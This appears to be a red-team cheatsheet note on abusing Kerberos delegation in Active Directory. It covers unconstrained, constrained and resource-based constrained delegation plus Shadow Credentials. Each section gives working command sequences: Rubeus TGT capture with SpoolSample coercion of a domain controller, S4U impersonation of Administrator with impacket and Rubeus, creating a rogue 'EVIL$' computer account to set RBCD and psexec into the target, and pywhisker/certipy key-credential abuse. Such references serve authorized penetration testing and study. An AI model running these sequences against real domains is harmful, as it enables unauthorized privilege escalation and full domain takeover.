---
tags: [hacking, active-directory, windows, delegation]
type: cheatsheet
source: compiled reference (Kerberos delegation) — added beyond base cheatsheet
last-verified: 2026-09-03
---

# Delegation Attacks

## Up
- [[Active Directory]]

Kerberos **delegation** lets a service act on behalf of a user to reach a back-end service. Misconfigured delegation is a top AD privilege-escalation path — and one the base cheatsheet only mentioned in passing. Find it with BloodHound ([[AD Enumeration]]) or `Get-DomainComputer -Unconstrained` / `-TrustedToAuth`.

---

## The Three Types

| Type | Attribute | Risk |
|---|---|---|
| **Unconstrained (KUD)** | `TRUSTED_FOR_DELEGATION` (UAC `0x80000`) | Caches any user's **TGT** on the host → capture DA's TGT |
| **Constrained (KCD)** | `msDS-AllowedToDelegateTo` (+ `TRUSTED_TO_AUTH_FOR_DELEGATION` = protocol transition) | Impersonate **any user** to the listed SPNs |
| **Resource-Based (RBCD)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` on the *target* | If you can write it, impersonate anyone to that target |

---

## 1. Unconstrained Delegation
Any user authenticating to an unconstrained-delegation host leaves their **TGT** in the host's memory. Compromise the host → dump TGTs → PtT. **Force a DC to authenticate to you** (coercion) to capture the **DC's** TGT → DCSync.

```powershell
Rubeus.exe monitor /interval:5 /nowrap            # watch for incoming TGTs
# coerce the DC to auth to our unconstrained host:
SpoolSample.exe DC01 UNCONSTRAINED-HOST           # or PetitPotam / Coercer (see [[NTLM Relay & Coercion]])
Rubeus.exe dump /nowrap                           # grab DC01$ TGT → ptt → DCSync
```
Printer Bug / PetitPotam make this reliable. **The DC's TGT ⇒ domain compromise.**

---

## 2. Constrained Delegation (KCD)
An account with `msDS-AllowedToDelegateTo` can request a ticket to those SPNs **as any user** via **S4U2Self + S4U2Proxy** (protocol transition). Compromise that account → impersonate Administrator to the target service.

```powershell
# enumerate
Get-DomainUser -TrustedToAuth ; Get-DomainComputer -TrustedToAuth
# abuse with the account's hash/AES → impersonate DA to the allowed SPN
Rubeus.exe s4u /user:websvc$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/fs.corp.local /ptt
```
```bash
impacket-getST -spn cifs/fs.corp.local -impersonate Administrator -hashes :<hash> corp.local/websvc$
export KRB5CCNAME=Administrator@... .ccache
```
**Note:** you can often swap the SPN service class (e.g. `cifs`→`host`/`ldap`) since the ticket's service name isn't validated — expands access beyond the listed SPN.

---

## 3. Resource-Based Constrained Delegation (RBCD)
If you can **write `msDS-AllowedToActOnBehalfOfOtherIdentity`** on a target computer (via GenericWrite/GenericAll/WriteDACL over it — see [[ACL & GPO Abuse]]) and you control an account **with an SPN** (any computer account; create one using the default `MachineAccountQuota=10`), you can impersonate anyone to that target.

```bash
# 1) create a computer account (MAQ default 10)
impacket-addcomputer corp.local/user:pass -computer-name 'EVIL$' -computer-pass 'Pass123!'
# 2) set RBCD on the target to trust EVIL$
impacket-rbcd corp.local/user:pass -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write
# 3) S4U impersonate → service ticket to the target as Administrator
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip <dc> corp.local/EVIL$:'Pass123!'
export KRB5CCNAME=Administrator@cifs_target.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```
```powershell
# Windows equivalents: PowerView Set-DomainRBCD / Set-DomainObject msds-allowedtoactonbehalf... + Rubeus s4u
```
RBCD is the go-to when BloodHound shows you have write over a computer object.

---

## Shadow Credentials *(added)*
If you have **write** over a target's `msDS-KeyCredentialLink` (GenericWrite/GenericAll — common via ACL abuse), add your own key-pair credential and authenticate as that object via **PKINIT** → get its TGT/NT hash. Works on users **and** computers; cleaner than password resets.

```bash
# pywhisker: add a KeyCredential to the target
pywhisker.py -d corp.local -u user -p pass --target 'TARGET$' --action add
# then PKINIT with the cert → TGT + NT hash
certipy-ad auth -pfx TARGET.pfx -dc-ip <dc>
gettgtpkinit.py -cert-pfx TARGET.pfx corp.local/'TARGET$' ticket.ccache
```
Windows: **Whisker** + **Rubeus asktgt /certificate**.

---

## Takeaways
- **Unconstrained** = capture TGTs (coerce the DC → domain). **Constrained** = S4U impersonate to allowed SPNs. **RBCD** = write the target's delegation attr → impersonate anyone to it.
- RBCD + Shadow Credentials turn a **write ACL** ([[ACL & GPO Abuse]]) into full compromise of a host/user.
- `MachineAccountQuota` (default 10) letting any user add computers is what makes RBCD easy — check/disable it.
- Pairs tightly with [[NTLM Relay & Coercion]] (coercion feeds unconstrained/RBCD) and [[AD CS Attacks]].
